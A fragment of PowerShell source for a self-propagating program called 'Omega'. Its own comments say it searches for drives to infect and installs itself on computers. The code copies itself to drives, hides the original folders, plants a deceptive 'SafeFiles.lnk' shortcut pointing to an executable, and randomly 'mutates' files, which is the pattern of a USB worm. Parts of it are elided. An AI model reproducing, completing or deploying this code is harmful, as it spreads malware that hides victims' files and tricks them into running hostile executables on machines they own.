...
Function Shortcuts([string]$path){      #These function creates the shortcut SafeFiles.lnk in the portable drive
	...
	$Shortcut_loc = "$_" + "SafeFiles.lnk"
	$shortcut_target = "$_" + "Omega\delta.exe"     
	$shortcut_icon = "$_" + "Omega\SafeFiles.ico"      
...
function Omega(){  #these is the main function, it searches for drives to infect, installs Omega in computers, prevents more than one Omega.exe to be active at the same time, and calls all the other functions that came before. Its al loop function.
	...
	if ($search -ne $null){
		...
		$dir_root | where-object{("$_" -ne $loc )} | foreach-object {new-item $_ -itemtype directory}{robocopy "$loc" $_  *.* copyall}
		$dir_root_to_hide = $dir_root | foreach-object {Get-Item $_ -Force}
		$dir_root_to_hide | foreach-object {$_.attributes = "Hidden"}


		$dir_root | foreach-object {
			$directory = $_
				 
			$Omega_Files = Get-ChildItem -Path $directory -Recurse
			
			$Files_to_Mutate = $Omega_Files | foreach-object {$_.name}  
			$Files_to_Mutate_loc = $Files_to_Mutate | foreach-object {$directory + "\" + $_}
			$Files_to_Mutate_loc | foreach-object {if ((Get-Random -Maximum 1000) -le 5) {Mutate -file $_}}
			}
		...
		$dir | foreach-object {
			if ($loc -ne "C:\Omega")        
			{
				start -FilePath C:\Omega\Omega.exe 
				exit
			}
			elseif (($_ -ne "C:\") -and ($loc -ne "$_Omega"))
			{
				Shortcuts -path $_
			}
			}	
